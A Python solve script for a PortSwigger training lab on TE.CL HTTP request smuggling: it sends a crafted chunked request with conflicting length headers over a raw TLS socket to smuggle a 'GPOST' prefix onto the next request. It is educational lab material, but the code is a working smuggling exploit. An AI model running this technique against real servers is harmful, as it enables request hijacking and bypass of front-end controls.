#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: HTTP request smuggling, basic TE.CL.

The front-end honours Transfer-Encoding; the back-end honours Content-Length.
We send a chunked body whose first chunk is 92 (0x5c) bytes long and contains
a complete smuggled HTTP request. The back-end's CL=4 makes it read only the
`5c\\r\\n` chunk-size line, leaving the smuggled request in the socket buffer.
The next request on the connection gets the smuggled prefix, producing
`Unrecognized method GPOST`.

Raw TLS sockets because `requests` normalizes conflicting length headers.
"""

import argparse
import socket
import ssl
import sys
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    """Open one TLS connection, send `body` `count` times, collect responses."""
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(description="Solve HTTP Request Smuggling Lab 2 (basic TE.CL)")
    parser.add_argument("lab_url", help="Lab URL, e.g. https://0aXX...web-security-academy.net")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    smuggled_chunk = (
        "GPOST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    assert len(smuggled_chunk.encode()) == 0x5c, (
        f"Smuggled chunk must be 0x5c (92) bytes; got {len(smuggled_chunk.encode())}"
    )

    print(f"[*] Sending TE.CL smuggle twice over one TLS connection to {host}:{port}")
    responses = send_sequence(host, port, body)

    for i, r in enumerate(responses, 1):
        head = r.split(b"\r\n\r\n", 1)[0].decode(errors="replace")
        print(f"\n[+] Response {i} status line + headers:\n{head[:400]}")

    if b"GPOST" in responses[-1] or b"Unrecognized method" in responses[-1]:
        print("\n[+] Smuggling confirmed — back-end saw 'GPOST'. Lab should be solved.")
    else:
        print("\n[-] Didn't see 'Unrecognized method GPOST' in the second response.")
        print("    Possible causes: wrong CL, missing final CRLF, HTTP/2 negotiated.")


if __name__ == "__main__":
    main()
